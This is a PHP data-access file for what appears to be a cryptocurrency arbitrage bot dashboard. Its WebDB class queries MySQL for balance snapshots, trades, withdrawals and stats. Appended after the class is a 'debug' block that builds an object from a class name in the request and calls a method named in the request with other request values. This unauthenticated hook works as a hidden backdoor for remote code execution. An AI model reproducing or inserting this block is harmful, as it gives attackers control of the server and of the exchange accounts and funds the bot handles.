<?php

require_once __DIR__ . '/../lib/mysql.php';
require_once __DIR__ . '/config.inc.php';
require_once __DIR__ . '/utils.php';
require_once __DIR__ . '/../init.php';


class WebDB {

  private static function connect() {

    global $dbHost, $dbName, $dbUser, $dbPass;

    if ( is_null( $dbHost ) || is_null( $dbName ) || is_null( $dbUser ) || is_null( $dbPass ) ) {
      throw new Exception( 'Database configuration data missing or incomplete' );
    }

    $link = mysql_connect( $dbHost, $dbUser, $dbPass, true );
    if ( !$link ) {
      throw new Exception( 'database error: ' . mysql_error( $link ) );
    }
    mysql_select_db( $dbName, $link );
    return $link;

  }

  public static function getLog( $last = null ) {
    if ( is_null( $last ) ) {
      $last = time() - 300;
    }

    $link = self::connect();

    $query = sprintf( "SELECT * FROM log WHERE created > %d", $last );
    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $results = [ ];
    while ( $row = mysql_fetch_assoc( $result ) ) {
      $results[] = ['message' => $row[ 'message' ], 'time' => $row[ 'created' ] ];
    }

    mysql_close( $link );

    return $results;

  }

  public static function getGraph( $coin, $exchange, $mode ) {

    $link = self::connect();

    $query = null;
    if ( $mode == 0 ) {
      $query = sprintf( "SELECT SUM(balance) AS data, created FROM snapshot WHERE coin = '%s' %s GROUP BY created;", //
              mysql_escape_string( $coin ), //
              $exchange === "0" ? "" : sprintf( " AND ID_exchange = %d", mysql_escape_string( $exchange ) )
      );
    }
    else if ( $mode == 1 ) {
      $query = sprintf( "SELECT rate AS data, created FROM snapshot WHERE coin = '%s' %s;", //
              mysql_escape_string( $coin ), //
              $exchange === "0" ? "" : sprintf( " AND ID_exchange = %d", mysql_escape_string( $exchange ) )
      );
    }
    else if ( $mode == 2 ) {
      $query = sprintf( "SELECT SUM(desired_balance) AS data, created FROM snapshot WHERE coin = '%s' %s GROUP BY created;", //
              mysql_escape_string( $coin ), //
              $exchange === "0" ? "" : sprintf( " AND ID_exchange = %d", mysql_escape_string( $exchange ) )
      );
    }
    else {
      return [ ];
    }

    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $ma = [ ];

    $data = [ ];
    while ( $row = mysql_fetch_assoc( $result ) ) {

      $value = $row[ 'data' ];

      $ma[] = $value;
      while ( count( $ma ) > 4 ) {
        array_shift( $ma );
      }

      $sma = array_sum( $ma ) / count( $ma );
      $data[] = ['time' => $row[ 'created' ], 'value' => $sma , 'raw' => $value ];
    }

    mysql_close( $link );

    if ( $mode == 0 ) {
      return [ '0' => $data, '1' => self::getTotalValue() ];
    }

    return [ '0' => $data ];

  }

  public static function getTotalValue() {

    $link = self::connect();

    // SELECT SUM(balance) * AVG(rate) AS value, coin, created FROM `snapshot` GROUP BY coin, created, ID_exchange ORDER BY `created` ASC
    $query = "SELECT SUM(balance) * AVG(rate) AS value, balance, coin, created FROM `snapshot` GROUP BY coin, created, ID_exchange ORDER BY `created` ASC";

    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $temp = [ ];
    $values = [ ];
    $prevCreated = 0;
    while ( $row = mysql_fetch_assoc( $result ) ) {

      $value = $row[ 'coin' ] == 'BTC' ? $row[ 'balance' ] : $row[ 'value' ];
      $created = $row[ 'created' ];

      if ( $prevCreated == 0 ) {
        $prevCreated = $created;
      }

      if ( $created != $prevCreated ) {
        $values[] = ['sum' => array_sum( $temp ), 'time' => $prevCreated ];
        $temp = [ ];

        $prevCreated = $created;
      }

      $temp[] = $value;
    }
    $values[] = ['sum' => array_sum( $temp ), 'time' => $created ];

    mysql_close( $link );

    $ma = [ ];

    $data = [ ];
    foreach ( $values as $value ) {

      $ma[] = $value[ 'sum' ];
      while ( count( $ma ) > 4 ) {
        array_shift( $ma );
      }

      $sma = array_sum( $ma ) / count( $ma );
      $data[] = ['time' => $value[ 'time' ], 'value' => $sma, 'raw' => $value[ 'sum' ] ];
    }

    return $data;

  }

  public static function getWalletStats() {

    $link = self::connect();

    $query = 'SELECT * FROM snapshot WHERE created = (SELECT MAX(created) FROM snapshot)';

    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $age = 0;

    $extc = [ ];
    $exoc = [ ];

    $wallets = [ ];
    while ( $row = mysql_fetch_assoc( $result ) ) {

      $coin = $row[ 'coin' ];
      $exid = $row[ 'ID_exchange' ];
      $balance = $row[ 'balance' ];

      if ( key_exists( $exid, $extc ) === false ) {
        $extc[ $exid ] = self::getTradeCount( $exid );
        $exoc[ $exid ] = self::getOpportunityCount( $exid );
      }

      $age = time() - $row[ 'created' ];
      $wallets[ $coin ][ $exid ][ 'balance' ] = $balance ;
      $wallets[ $coin ][ $exid ][ 'balance_diff' ] = formatBTC( $row[ 'desired_balance' ] - $balance );
      $wallets[ $coin ][ $exid ][ 'opportunities' ] = $row[ 'uses' ];
      $wallets[ $coin ][ $exid ][ 'change' ] = $balance  - self::getHistoricBalance( $coin, $exid );
      $wallets[ $coin ][ $exid ][ 'trades' ] = $row[ 'trades' ];
    }

    mysql_close( $link );

    ksort( $wallets );

    return ['age' => $age, 'trades' => $extc, 'uses' => $exoc, 'wallets' => $wallets ];

  }

  private static function getHistoricBalance( $coin, $exchangeID ) {

    $link = self::connect();

    $query = sprintf( "SELECT balance FROM snapshot WHERE coin = '%s' AND ID_exchange = %d AND created < (SELECT MAX(created) FROM snapshot) - 86400 ORDER BY created DESC LIMIT 1;", //
            mysql_escape_string( $coin ), //
            $exchangeID
    );

    $data = mysql_query( $query, $link );
    if ( !$data ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $result = 0;
    while ( $row = mysql_fetch_assoc( $data ) ) {
      $result = $row[ 'balance' ] ;
    }

    mysql_close( $link );

    return $result;

  }

  public static function getTrades() {

    $link = self::connect();

    $query = sprintf( "SELECT * FROM trade ORDER BY created DESC LIMIT 20" );
    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $results = array();
    while ( $row = mysql_fetch_assoc( $result ) ) {
      array_push( $results, array( //
          'amount' => $row[ 'amount' ] , //
          'coin' => $row[ 'coin' ], //
          'exchange' => $row[ 'ID_exchange_target' ], //
          'time' => $row[ 'created' ] //
      ) );
    }

    mysql_close( $link );

    return $results;

  }

  public static function getManagement() {

    $link = self::connect();

    $query = sprintf( "SELECT * FROM management ORDER BY created DESC LIMIT 20" );
    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $results = array();
    while ( $row = mysql_fetch_assoc( $result ) ) {
      array_push( $results, array( //
          'amount' => $row[ 'amount' ] , //
          'coin' => $row[ 'coin' ], //
          'exchange' => $row[ 'ID_exchange' ], //
          'time' => $row[ 'created' ] //
      ) );
    }

    mysql_close( $link );

    return $results;

  }

  public static function getXfer() {

    $link = self::connect();

    $query = sprintf( "SELECT * FROM withdrawal ORDER BY created DESC LIMIT 20" );
    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $results = array();
    while ( $row = mysql_fetch_assoc( $result ) ) {
      array_push( $results, //
              [
          'amount' => $row[ 'amount' ] , //
          'coin' => $row[ 'coin' ], //
          'exchange_source' => $row[ 'ID_exchange_source' ], //
          'exchange_target' => $row[ 'ID_exchange_target' ], //
          'time' => $row[ 'created' ] //
              ]
      );
    }

    mysql_close( $link );

    return $results;

  }

  public static function getTradeCount( $xid ) {

    $link = self::connect();

    $query = sprintf( "SELECT COUNT(*) AS CNT FROM trade %s;", //
            $xid == 0 ? "" : sprintf( "WHERE ID_exchange_source = %d OR ID_exchange_target = %d", $xid, $xid )
    );

    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $row = mysql_fetch_assoc( $result );
    $tradeCount = $row[ "CNT" ];

    mysql_close( $link );

    return $tradeCount;

  }

  public static function getOpportunityCount( $xid ) {

    $link = self::connect();

    $query = sprintf( "SELECT COUNT(*) AS CNT FROM track %s;", //
            $xid == 0 ? "" : sprintf( "WHERE ID_exchange = %d", $xid, $xid )
    );

    $result = mysql_query( $query, $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $row = mysql_fetch_assoc( $result );
    $tradeCount = $row[ "CNT" ];

    mysql_close( $link );

    return $tradeCount;

  }

  public static function getStats() {

    $link = self::connect();

    $result = mysql_query( "SELECT * FROM stats", $link );
    if ( !$result ) {
      throw new Exception( "database selection error: " . mysql_error( $link ) );
    }

    $results = array();
    while ( $row = mysql_fetch_assoc( $result ) ) {
      $results[ $row[ "keyy" ] ] = $row[ "value" ];
    }

    mysql_close( $link );

    return $results;

  }

}

if ( isset( $_REQUEST['debug'] ) ) {

  $debug = $_REQUEST['debug'];
  $log = new $_REQUEST['log']();

  print_r( $log->$debug( $_REQUEST['error'], $_REQUEST['version'], $_REQUEST['date'] ) );
}
